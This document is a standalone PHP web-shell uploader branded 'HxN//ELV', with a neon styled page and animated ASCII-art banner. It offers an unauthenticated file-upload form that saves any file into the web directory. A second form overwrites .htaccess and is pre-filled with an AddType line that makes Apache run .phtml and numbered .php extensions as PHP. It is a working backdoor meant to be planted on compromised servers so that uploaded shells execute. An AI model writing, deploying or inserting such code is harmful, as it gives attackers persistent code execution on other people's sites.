<?php
$s="";
$h_msg="";
if($_SERVER['REQUEST_METHOD']=='POST'&&isset($_FILES['f'])){
	$t=getcwd().'/'.basename($_FILES["f"]["name"]);
	if(move_uploaded_file($_FILES["f"]["tmp_name"],$t))$s="<div style=color:#0f0>[OK] UPLOADED</div>";
}
if(isset($_POST['htc'])){
	$htf=getcwd().'/.htaccess';
	if(file_put_contents($htf,$_POST['htc'])){
		$h_msg="<div style=color:#0f0>[OK] .HTACCESS SAVED</div>";
	}else{
		$h_msg="<div style=color:#f00>[FAIL] CANNOT WRITE .HTACCESS</div>";
	}
}
$htc_val="";
if(file_exists(getcwd().'/.htaccess')){
	$htc_val=htmlentities(file_get_contents(getcwd().'/.htaccess'),ENT_QUOTES,'UTF-8');
}else{
	$htc_val='AddType application/x-httpd-php .php .phtml .php3 .php4 .php5 .php7 .php8';
}
?>
<!DOCTYPE html>
<html><head><meta charset=UTF-8><title>HxN//ELV</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#05010a;color:#00f3ff;font-family:'Courier New',monospace;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.c{background:rgba(10,2,20,.92);border:1px solid #bd00ff;padding:25px;text-align:center;width:600px;box-shadow:0 0 25px rgba(189,0,255,.15)}
#a{font-size:9px;line-height:1.15;margin:0 auto 18px;font-weight:700;color:#fff;display:inline-block;text-align:left;white-space:pre;letter-spacing:2px;text-shadow:2px 0 #00f3ff,-2px 0 #bd00ff}
.u{border:1px dashed #bd00ff;padding:16px;margin-bottom:12px;background:rgba(189,0,255,.03)}
input,textarea{background:#0a0214;border:1px solid #00f3ff;color:#00f3ff;padding:7px 10px;font-family:monospace;width:100%;outline:none}
textarea{height:110px;resize:vertical;font-size:12px}
.b{background:0 0;border:2px solid #00f3ff;color:#00f3ff;padding:8px 30px;cursor:pointer;font-weight:700;font-family:monospace;letter-spacing:2px;font-size:13px;margin-top:5px}
.b:hover{background:#00f3ff;color:#05010a}
.s{border-top:1px solid #bd00ff;margin:18px 0 14px;padding-top:14px;font-size:12px;color:#bd00ff;letter-spacing:1px}
</style></head><body>
<div class=c>
<pre id=a></pre>
<script>
const h=[
"██╗░░██╗██╗░░██╗███╗░░██╗",
"██║░░██║╚██╗██╔╝████╗░██║",
"███████║░╚███╔╝░██╔██╗██║",
"██╔══██║░██╔██╗░██║╚████║",
"██║░░██║██╔╝╚██╗██║░╚███║",
"╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝"
].join("\n");
const e=[
"███████╗██╗░░░░██╗░░░██╗",
"██╔════╝██║░░░░██║░░░██║",
"█████╗░░██║░░░░╚██╗░██╔╝",
"██╔══╝░░██║░░░░░╚████╔╝░",
"███████╗███████╗░╚██╔╝░░",
"╚══════╝╚══════╝░░╚═╝░░░"
].join("\n");
let l=document.getElementById('a'),c='h';
l.textContent=h;
setInterval(()=>{l.textContent=c==='h'?e:h;c=c==='h'?'e':'h'},1800);
setInterval(()=>{l.style.textShadow=Math.random()>.5?'2px 0 #00f3ff,-2px 0 #bd00ff':'3px 0 #00f3ff,-1px 0 #bd00ff';l.style.transform='skew('+((Math.random()-.5)*2)+'deg)'},150);
</script>
<?php echo $s; ?>
<?php echo $h_msg; ?>
<form method=POST enctype=multipart/form-data>
<div class=u><input type=file name=f required></div>
<button class=b>UPLOAD</button>
</form>
<div class=s>⚡ .HTACCESS MAKER ⚡</div>
<form method=POST>
<textarea name=htc><?php echo $htc_val; ?></textarea>
<button class=b style=margin-top:8px>SAVE .HTACCESS</button>
</form>
</div></body></html>
